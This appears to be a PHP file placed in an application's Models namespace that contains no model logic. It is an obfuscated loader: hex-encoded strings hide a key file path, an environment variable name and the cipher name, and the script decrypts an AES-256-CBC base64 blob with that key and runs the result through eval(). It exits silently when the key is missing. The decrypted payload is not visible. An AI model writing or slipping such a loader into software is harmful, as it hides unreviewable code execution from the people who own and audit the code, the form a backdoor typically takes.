<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('Uc21YfDsGXKwAOFoUvE5NA==');

$c=base64_decode(

'sfToTZ/3Bmo7WEWmwL6SLNMmE1cyBZncCTKxSU4M6ubBgTYKL7gNVndmnElBCHoP+5N+nOV1wFcO' .
'PBbe5pI7s7AoILZ1n/uI13fUy2nsrfgb5bv1vKfEOyNcwL4yo+02M91cmq119FmZq5xymhApWhh6' .
'E7ay44WH7vqVeTh/p13DABTBH8lHhoUctB6hkbDvB/3Ep6v0Q1c8+mGrTuMvSgnzn9wBvIX2b1K+' .
'GiqKf6F+7By6JPc5O6Ace6wV+Q5i4VaUmLVDrM4wdCUUJVTfaBnJKGb9EyETQGyVnrJOAWCZHKyU' .
'FSa/QDesgxUDU9lkvSPPdI1tGyMtETssmPNH0q9UyE8nR8XPdyeIWlhhn7YCHYqIpc/YKYnfbst9' .
'QIFwhZXPCNcN2u3sU/qn16knD93fGtMw9P5Bptbrg2cpxw9l43GgkqwUM75sBqKu3On4NR6Aufdc' .
'V6Kzk4x0VYdjTvgRSm2ABII3/JPbeo6B+Or/o2kuQiIXceFd0dFQvZWx2SPX4KBf/l1Oo4yTn7F7' .
'e9c2HG0gUnVkOjbZDuzLXSZxfeY8wsGt+CmqLPdSCDPzJyvLjmXgV7lau2fU3KptpheFQJJHl6jV' .
'kjSOxb6XpRsTcENtavXrxzvgDk38LP9PbG/gq++BjAbuLVimuSzMOzMYEk7mA3uzHUHy7JHDHkfL' .
'jyKZzedjtT0Iy29r9Oau4Zvf1O5UirL66zxhX6Id4kKbUbcCYwpAqkJl3mnu9jiW5sCm6ycLzsIZ' .
'65V+BfqV6jzi6bgzZJsp7xQbFj2ehYLH+xwtJIaCsxy1N0pAs/hbbVH18MEpj3iy60f6kVcxu+ft' .
'zAIuUj3BVfk8qF3b+sk6rq6hCDsAduyPDqPyFVfA/kqNCQE3dTg9ksto0xGlItIlj+cBVLxWuKtI' .
'2MFCtA=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

